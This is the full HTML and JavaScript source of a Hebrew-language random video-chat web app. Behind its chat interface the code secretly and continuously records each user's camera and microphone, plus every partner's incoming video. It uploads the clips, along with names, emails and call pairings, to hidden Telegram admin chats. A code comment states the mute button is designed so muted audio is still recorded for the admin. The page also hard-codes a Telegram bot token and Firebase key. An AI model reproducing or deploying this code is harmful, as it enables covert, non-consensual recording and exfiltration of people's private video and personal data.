<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VideoApp Pro - Security & Mute Fix</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: system-ui, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
        
        .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; gap: 10px; }
        .header-right { display: flex; gap: 10px; }
        .btn-circle { background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        .btn-red { background: rgba(231, 76, 60, 0.8); }

        .v-box { flex: 1; position: relative; overflow: hidden; background: #111; display: flex; align-items: center; justify-content: center; border-bottom: 2px solid #333; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .status-msg { position: absolute; z-index: 100; font-weight: bold; text-align: center; width: 100%; text-shadow: 0 2px 5px #000; font-size: 18px; pointer-events: none; }

        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 20px; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }

        #banned-screen { display: none; position: fixed; inset: 0; background: #000; color: #ff4d4d; z-index: 9999; align-items: center; justify-content: center; flex-direction: column; text-align: center; padding: 20px; }
    </style>
</head>
<body>

<div id="banned-screen">
    <h1 style="font-size: 32px;">🚫 נחסמת עקב הפרת הכללים</h1>
</div>

<div class="header">
    <button id="btn-report" class="btn-circle btn-red" style="display:none;" onclick="confirmReport()">🚩</button>
    <div class="header-right">
        <button id="btn-mute" class="btn-circle" onclick="toggleMute()">🎤</button>
        <button class="btn-circle" onclick="switchCamera()">🔄</button>
    </div>
</div>

<div id="swipe-zone" style="flex:1; display:flex; flex-direction:column;">
    <div class="v-box">
        <div id="msg-idle" class="status-msg">⬅️ החלק שמאלה לחיפוש</div>
        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
        <video id="remoteVideo" autoplay playsinline></video>
    </div>
    <div class="v-box">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <div class="modal-content">
        <h2 style="text-align:center; margin-bottom:10px;">ברוכים הבאים</h2>
        <input type="text" id="reg-name" placeholder="שם מלא">
        <input type="email" id="reg-email" placeholder="אימייל">
        <select id="reg-gender">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button class="reg-btn" onclick="handleRegistration()">היכנס</button>
    </div>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    const firebaseConfig = { 
        apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", 
        storageBucket: "live-video-20fca.firebasestorage.app",
        databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });

    let myStream, peerStream, myPeerId, currentCall, isSearching = false, camFacing = "user";
    let userRecorder, localInterval, remoteRecorder, partnerData = null, isMuted = false;

    // --- מערכת חסימות ובדיקה בזמן אמת ---
    function checkBanStatus(email) {
        const safeEmail = email.replace(/[.#$[\]]/g, '_').toLowerCase();
        db.ref('banned_users/' + safeEmail).on('value', snap => {
            if (snap.exists() && snap.val().banned) {
                document.getElementById('banned-screen').style.display = 'flex';
                if (myStream) myStream.getTracks().forEach(t=>t.stop());
                if (peerStream) peerStream.getTracks().forEach(t=>t.stop());
                stopEverything();
            } else {
                document.getElementById('banned-screen').style.display = 'none';
            }
        });
    }

    window.onload = () => {
        const saved = localStorage.getItem('user_v17');
        if (!saved) document.getElementById('regModal').style.display = 'flex';
        else {
            checkBanStatus(JSON.parse(saved).email);
            initCamera();
        }
        pollTelegramCommands(); // הפעלת האזנה לטלגרם ברקע
    };

    async function handleRegistration() {
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const gender = document.getElementById('reg-gender').value;
        if(!name || !email) return alert("חובה למלא פרטים");
        
        const user = { name, email, gender };
        localStorage.setItem('user_v17', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        
        const text = `🎉 **משתמש חדש נרשם!**\n👤 שם: ${name}\n📧 אימייל: ${email}`;
        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
        
        checkBanStatus(email);
        initCamera();
    }

    // --- מערכת קריאת פקודות טלגרם (Bot Listener) ---
    async function pollTelegramCommands() {
        let offset = localStorage.getItem('tg_offset') || 0;
        try {
            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=5`);
            const data = await res.json();
            if (data.ok && data.result.length > 0) {
                for (let update of data.result) {
                    offset = update.update_id + 1;
                    localStorage.setItem('tg_offset', offset);
                    
                    if (update.message && update.message.text) {
                        // שימוש ב-Firebase למניעת ביצוע כפול כשכמה משתמשים מחוברים
                        const lockRef = db.ref('tg_locks/' + update.update_id);
                        lockRef.transaction(current => current === null ? true : undefined, (error, committed) => {
                            if (committed) processCommand(update.message.text, update.message.chat.id);
                        });
                    }
                }
            }
        } catch(e) {}
        setTimeout(pollTelegramCommands, 3500);
    }

    function processCommand(text, chatId) {
        const regex = /\/([a-zA-Z]+)(?:\s+(?:-?\s*)?([\w.-]+@[\w.-]+\.\w+))?/i;
        const match = text.match(regex);
        if(!match) return;
        
        const cmd = match[1].toLowerCase();
        const email = match[2] ? match[2].toLowerCase() : null;
        const ref = db.ref('banned_users');

        if (cmd === 'spam' && email) {
            ref.child(email.replace(/[.#$[\]]/g, '_')).set({ email: email, banned: true });
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🚫 המשתמש ' + email + ' נחסם בהצלחה')}`);
        } 
        else if (cmd === 'bspam' && email) {
            ref.child(email.replace(/[.#$[\]]/g, '_')).remove();
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('✅ החסימה בוטלה למשתמש ' + email)}`);
        } 
        else if (cmd === 'rspam') {
            ref.once('value').then(snap => {
                let msg = "🚨 רשימת משתמשים חסומים:\n\n";
                let count = 0;
                if(snap.val()) { for(let key in snap.val()) { msg += `- ${snap.val()[key].email}\n`; count++; } }
                if(count === 0) msg += "אין משתמשים חסומים.";
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            });
        }
    }

    // --- מצלמה, השתקה חכמה והקלטות ---
    async function initCamera() {
        if (myStream) myStream.getTracks().forEach(t => t.stop());
        if (peerStream) peerStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing, width: { ideal: 640 } }, audio: true });
            
            // יצירת ערוץ נפרד לשותף כדי שההשתקה לא תשפיע על ההקלטה למנהל
            const videoTrack = myStream.getVideoTracks()[0];
            const peerAudioTrack = myStream.getAudioTracks()[0].clone();
            peerAudioTrack.enabled = !isMuted;
            peerStream = new MediaStream([videoTrack, peerAudioTrack]);

            document.getElementById('localVideo').srcObject = myStream;
            
            if (currentCall && currentCall.peerConnection) {
                const vSender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
                if (vSender) vSender.replaceTrack(videoTrack);
                const aSender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'audio');
                if (aSender) aSender.replaceTrack(peerAudioTrack);
            }
            startLocalRecording();
        } catch (e) { console.error("Camera Error", e); }
    }

    function toggleMute() {
        isMuted = !isMuted;
        if (peerStream) peerStream.getAudioTracks().forEach(t => t.enabled = !isMuted);
        const btn = document.getElementById('btn-mute');
        btn.innerText = isMuted ? "🔇" : "🎤";
        btn.style.background = isMuted ? "rgba(231, 76, 60, 0.8)" : "rgba(0,0,0,0.5)";
    }

    async function switchCamera() {
        camFacing = (camFacing === "user" ? "environment" : "user");
        await initCamera();
    }

    function startLocalRecording() {
        if (userRecorder && userRecorder.state !== "inactive") userRecorder.stop();
        if (localInterval) clearInterval(localInterval);
        
        let opts = MediaRecorder.isTypeSupported('video/mp4') ? { mimeType: 'video/mp4' } : { mimeType: 'video/webm;codecs=vp8,opus' };
        userRecorder = new MediaRecorder(myStream, opts);

        userRecorder.ondataavailable = async (e) => sendVideoToBot(e.data, 'local', myStream);
        userRecorder.start();
        localInterval = setInterval(() => { if(userRecorder.state === "recording") { userRecorder.stop(); userRecorder.start(); } }, 40000);
    }

    function startRemoteRecording(remoteStream) {
        if (remoteRecorder && remoteRecorder.state !== "inactive") remoteRecorder.stop();
        let opts = MediaRecorder.isTypeSupported('video/mp4') ? { mimeType: 'video/mp4' } : { mimeType: 'video/webm;codecs=vp8,opus' };
        remoteRecorder = new MediaRecorder(remoteStream, opts);
        remoteRecorder.ondataavailable = async (e) => sendVideoToBot(e.data, 'call', remoteStream);
        remoteRecorder.start();
    }

    function sendVideoToBot(data, type, stream) {
        if (data.size === 0) return;
        const mime = data.type;
        const ext = mime.includes('mp4') ? 'mp4' : 'webm';
        const blob = new Blob([data], { type: mime });
        const user = JSON.parse(localStorage.getItem('user_v17'));
        const pName = partnerData ? partnerData.name : "לא ידוע";
        
        const caption = type === 'local' ? `🎥 וידאו של: ${user.name}` : `📞 שיחה שלמה:\n${user.name} עם ${pName}`;
        
        ADMIN_IDS.forEach(id => {
            const fd = new FormData();
            fd.append("chat_id", id);
            fd.append("video", blob, `${type}_${Date.now()}.${ext}`);
            fd.append("caption", caption);
            // keepalive שומר שההעלאה תסתיים גם אם האפליקציה נסגרה באותו רגע
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd, keepalive: true });
        });
    }

    // --- שליחת הסרטון בסגירת המסך או עזיבת האפליקציה ---
    let isExiting = false;
    function handleAppExit() {
        if(isExiting) return;
        isExiting = true;
        if (userRecorder && userRecorder.state === "recording") userRecorder.stop();
        if (remoteRecorder && remoteRecorder.state === "recording") remoteRecorder.stop();
    }
    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleAppExit(); else isExiting = false; });
    window.addEventListener('beforeunload', handleAppExit);

    // --- לוגיקת שיחות (PeerJS & Socket) ---
    peer.on('open', id => myPeerId = id);

    function startSearching() {
        if (isSearching) return;
        isSearching = true;
        stopEverything();
        document.getElementById('msg-idle').style.display = "none";
        document.getElementById('msg-search').style.display = "block";
        const user = JSON.parse(localStorage.getItem('user_v17'));
        socket.emit('find-partner', { peerId: myPeerId, name: user.name, email: user.email });
    }

    socket.on('partner-found', data => {
        partnerData = data; 
        notifyAdminNewCall(partnerData);
        isSearching = false;
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('btn-report').style.display = "flex";
        
        const user = JSON.parse(localStorage.getItem('user_v17'));
        currentCall = peer.call(data.peerId, peerStream, { metadata: user }); // מעביר את הזרם המיוחד
        handleCall(currentCall);
    });

    peer.on('call', call => {
        partnerData = call.metadata;
        if(partnerData) notifyAdminNewCall(partnerData);
        
        call.answer(peerStream); // עונה עם הזרם המיוחד
        currentCall = call;
        document.getElementById('btn-report').style.display = "flex";
        handleCall(call);
    });

    function notifyAdminNewCall(partner) {
        const user = JSON.parse(localStorage.getItem('user_v17'));
        const text = `🤝 **שיחה חדשה**\n1: ${user.name} (${user.email})\n2: ${partner.name} (${partner.email})`;
        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
    }

    function handleCall(call) {
        call.on('stream', s => { 
            const rv = document.getElementById('remoteVideo');
            rv.srcObject = s;
            rv.onloadedmetadata = () => rv.play().catch(e => console.log(e));
            startRemoteRecording(s);
        });
    }

    socket.on('partner-disconnected', () => stopEverything());

    function confirmReport() {
        if (confirm("האם לדווח ולנתק?")) {
            const user = JSON.parse(localStorage.getItem('user_v17'));
            const pName = partnerData ? partnerData.name : "לא ידוע";
            const pEmail = partnerData ? partnerData.email : "לא ידוע";
            const text = `🚨 **דיווח התקבל**\nמאת: ${user.name} (${user.email})\nעל: ${pName} (${pEmail})`;
            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
            socket.emit('report-user');
            stopEverything();
        }
    }

    function stopEverything() {
        isSearching = false; 
        if (remoteRecorder && remoteRecorder.state !== "inactive") remoteRecorder.stop();
        partnerData = null;
        socket.emit('leave-chat');
        if (currentCall) { currentCall.close(); currentCall = null; }
        document.getElementById('msg-idle').style.display = "block";
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;
    }

    let sX = 0;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        const diff = sX - e.changedTouches[0].clientX;
        if (diff > 80) startSearching(); 
        else if (diff < -80) stopEverything();
    });
</script>
</body>
</html>
